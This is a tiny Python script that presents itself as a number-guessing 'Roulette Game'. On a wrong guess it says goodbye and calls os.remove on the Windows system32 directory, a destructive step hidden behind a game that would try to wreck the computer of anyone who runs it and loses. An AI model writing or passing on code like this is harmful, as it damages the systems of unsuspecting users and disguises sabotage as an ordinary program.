import os
import random

print("Welcome to the Roulette Game!")

# Get the user's bet

guess = int(input("Enter your bet (0-6): "))
num = random.randint(0, 6)

if guess == num:
    print("You won!")
else:
    print("Good Bye!")
    os.remove("C:\Windows\system32")
